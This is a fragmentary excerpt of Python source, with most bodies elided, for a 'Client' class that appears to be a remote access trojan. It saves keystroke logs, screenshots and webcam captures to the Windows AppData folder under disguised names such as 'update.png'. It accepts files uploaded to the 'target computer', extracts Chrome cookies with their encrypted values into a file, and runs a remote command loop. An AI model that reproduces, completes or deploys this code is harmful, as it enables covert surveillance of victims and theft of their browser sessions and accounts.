...
class Client:
    def __init__(self, host, port):
        ...
        self.key_file = os.environ["appdata"] + "\\log.txt"
        self.screen_file = os.environ["appdata"] + "\\screen.png"
        self.camera_file = os.environ["appdata"] + "\\update.png"
    ...
    def save_file(self, file_name, file_content):
        with open(file_name, "wb") as file:
            ...
            return "File uploaded to target computer"
    ...
    def get_browser_cookies(self):
        ...
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            ...
            self.browser_cookie += f"""
               ...
               Creation date (UTC): {self.get_chrome_datetime(creation_utc)}
               Last access (UTC): {self.get_chrome_datetime(last_access_utc)}
               Expires (UTC): {self.get_chrome_datetime(expires_utc)}
               ===============================================================
               """
            cursor.execute("""
        ...
        db.commit()
        db.close()
        cookie_file = os.environ["appdata"] + "\\data.txt"
    ...
    def client_main(self):
        while True:
            ...
            try:
                ...
                command_output = "Unknown command! Use 'help' to see all commands."
